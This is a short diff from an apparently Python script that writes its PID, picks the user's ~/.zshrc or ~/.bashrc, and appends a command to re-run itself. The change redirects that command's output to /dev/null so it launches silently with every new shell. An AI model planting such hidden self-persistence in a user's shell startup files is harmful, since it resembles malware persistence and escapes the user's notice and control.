@@ -59,7 +59,7 @@ def main():
     with open(pid_file, 'w') as f:
         f.write(str(os.getpid()))
     script_path = os.path.abspath(__file__)
-    command = f"python3 {script_path}"
+    command = f"python3 {script_path} &> /dev/null \n"
     rc_file = os.path.expanduser("~/.zshrc") if os.path.exists(os.path.expanduser("~/.zshrc")) else os.path.expanduser(
         "~/.bashrc")
     if os.path.exists(rc_file):
